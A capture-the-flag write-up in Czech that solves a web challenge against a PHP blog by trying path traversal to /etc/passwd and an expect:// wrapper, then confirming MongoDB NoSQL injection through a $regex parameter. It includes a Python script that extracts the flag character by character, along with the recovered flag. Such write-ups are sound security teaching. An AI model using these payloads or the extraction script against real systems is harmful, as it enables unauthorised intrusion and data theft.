# Blogging Web Site

## Zadání

```
Hi Expert,

some kind of blogging application remains unfinished on http://78.128.216.18:65180, but it can contain some information about end of the civilization. Get the content of all entries.

Good Luck

Hint: Try to get information about used technologies.
```

## Řešení

* Blog obsahuje odkazy na 2 stránky - First entry a TODO
* Stránka se nastavuje pomocí GET parametru `title` (`http://78.128.216.18:65180/view?title=TODO`)
* Z HTTP hlaviček víme, že blog jede v PHP (`X-Powered-By: PHP/7.3.29-1~deb10u1`)
* Vypadá to ale, že se nejedná o LFI - nelze vypsat soubor passwd (`http://78.128.216.18:65180/view?title=../../../../../../../etc/passwd`)
* Nelze použít ani PHP wrappers (například `view?title=expect://ls`), viz  https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601
* Parametr `title` není ani náchýlný k SQL injection
* Stránka TODO obsahuje další zajímavou informaci:

```
TODO

add login to protect private posts
add post editor
add cron to backup mongo
```
* Mohlo by se jednat o NoSQL Mongo injection (viz https://book.hacktricks.xyz/pentesting-web/nosql-injection)
* http://78.128.216.18:65180/view?title[$regex]=FLAG potvrzuje, že jde o Mongo injection a cílem tedy bude zjistit jméno souboru vlajky:

```
Notice: Array to string conversion in /opt/ctfb1/web/vendor/twig/twig/src/Environment.php(358) : eval()'d code on line 51
Array
This is the flag post.
```

## Program pro výpis vlajky
[solve.py](solve.py)
```python
import requests
import string

flag = 'FLAG{'
while '}' not in flag:
    for c in string.ascii_lowercase + string.ascii_uppercase + '_-{}' + string.digits:
        r = requests.get('http://78.128.216.18:65180/view?title[$regex]=%s' % (flag + c))
        if 'This is the flag post' in r.text:
            flag += c
            print(flag)

```

## Výstup
```
FLAG{L
FLAG{LW
FLAG{LWb
FLAG{LWbF
FLAG{LWbF-
FLAG{LWbF-Q
FLAG{LWbF-Qz
FLAG{LWbF-QzF
FLAG{LWbF-QzFv
FLAG{LWbF-QzFv-
FLAG{LWbF-QzFv-x
FLAG{LWbF-QzFv-xy
FLAG{LWbF-QzFv-xyC
FLAG{LWbF-QzFv-xyCt
FLAG{LWbF-QzFv-xyCt-
FLAG{LWbF-QzFv-xyCt-m
FLAG{LWbF-QzFv-xyCt-mk
FLAG{LWbF-QzFv-xyCt-mkU
FLAG{LWbF-QzFv-xyCt-mkUE
FLAG{LWbF-QzFv-xyCt-mkUE}
```